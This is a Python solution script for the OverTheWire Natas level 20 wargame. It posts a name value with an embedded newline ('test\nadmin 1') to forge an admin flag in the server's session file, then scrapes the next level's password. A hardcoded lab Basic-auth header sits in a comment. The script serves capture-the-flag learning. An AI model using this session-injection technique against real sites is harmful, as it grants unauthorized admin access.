import requests
import re
from requests.auth import HTTPBasicAuth
def solve20(username, password):
    session = requests.session()
    session.auth = HTTPBasicAuth(username, password)
    #session.headers["Authorization"] = "Basic bmF0YXMyMDplb2ZtM1dzc2h4YzVid3RWbkV1R0lscjdpdmI5S0FCRg=="
    session.headers["Content-Type"] = "application/x-www-form-urlencoded"
    url = "http://natas20.natas.labs.overthewire.org/index.php"

    session.post(url, data="name=test\nadmin 1")
    resp = session.get(url)

    pw = re.findall(r'[a-zA-Z0-9]{32}', resp.text)[-1]
    return pw

